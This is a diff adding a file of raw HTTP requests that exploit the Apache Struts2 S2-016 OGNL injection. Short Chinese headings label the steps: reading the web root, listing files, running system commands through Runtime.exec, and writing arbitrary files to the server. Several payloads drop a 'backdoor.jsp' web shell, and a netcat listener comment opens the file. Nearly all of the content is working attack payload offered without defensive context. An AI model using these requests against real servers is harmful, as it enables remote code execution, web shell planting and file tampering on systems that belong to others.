@@ -1,0 +1,82 @@
+//nc -nvv host port
+GET /struts2-16/example/HelloWorld.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22/backdoor.jsp%22).replaceAll("\\\\",%20"/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e
+
+//windows mfc test
+GET /struts2-16/example/HelloWorld.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22/backdoor.jsp%22).replaceAll("\\\\\\\\",%20"/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e 
+
+//testing
+POST /struts2-16/example/HelloWorld.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22/backdoor.jsp%22).replaceAll("\\\\",%20"/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}%20HTTP/1.1\r\nHost:%20*\r\nContent-Type:%20application/x-www-form-urlencoded\r\nContent-Length:%203\r\n\r\n c=t\r\n\r\n\r\n\r\n
+
+POST /struts2-16/example/HelloWorld.action HTTP/1.1\r\nHost:%20*\r\nContent-Type:%20application/x-www-form-urlencoded\r\nContent-Length:%203\r\n\r\n c=t\r\n\r\n\r\n\r\n
+
+//exp2 POST command urlencoded
+redirect:${%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23req%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%23req.getParameter%28%22cmd%22%29%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29}&cmd=whoami
+
+#### [start]获取网站根目录
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+Host: *
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length:559
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23a.getRealPath(%22/%22)%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29
+#### [end]
+
+#### [start]获取文件列表
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+Host: *
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 500
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles().length%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29
+###### 通过数组下标取得数据
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+User-Agent: Java/1.8.0_45
+Host: 192.168.1.4:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 509
+
+debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%40java.io.File%40listRoots()%5b0%5d.listFiles()%5b0%5d.getName()%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29
+
+#### [end]
+
+#### [start]命令行执行
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+Host: *
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 791
+
+redirect:${%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23req%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%23req.getParameter%28%22cmd%22%29%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29}&cmd=whoami
+#### [end]
+
+
+#### [start]成功上传数据到网站根目录
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+Host: *
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 847
+
+redirect:${%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%29%2c%23b%3dnew+java.io.FileOutputStream%28new%20java.lang.StringBuilder%28%23a.getRealPath%28%22/%22%29%29.append%28@java.io.File@separator%29.append%28%23a.getParameter%28%22name%22%29%29.toString%28%29%29%2c%23b.write%28%23a.getParameter%28%22t%22%29.getBytes%28%29%29%2c%23b.close%28%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%22BINGO%22%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29}&name=data.jsp&t=11111111111\r\n\r\n\r\n\r\n
+
+#### [end]
+
+
+#### [start]自定义上传路径
+POST /struts2-16/example/HelloWorld.action? HTTP/1.1
+Host: *
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 809
+
+redirect:${%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%29%2c%23b%3dnew+java.io.FileOutputStream%28new%20java.lang.StringBuilder%28%23a.getParameter%28%22name%22%29%29.toString%28%29%29%2c%23b.write%28%23a.getParameter%28%22t%22%29.getBytes%28%29%29%2c%23b.close%28%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%22BINGO%22%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29}&name=/root/apache-tomcat-8.0.3/webapps/ROOT/test.jsp&t=11111111111
+#### [end]
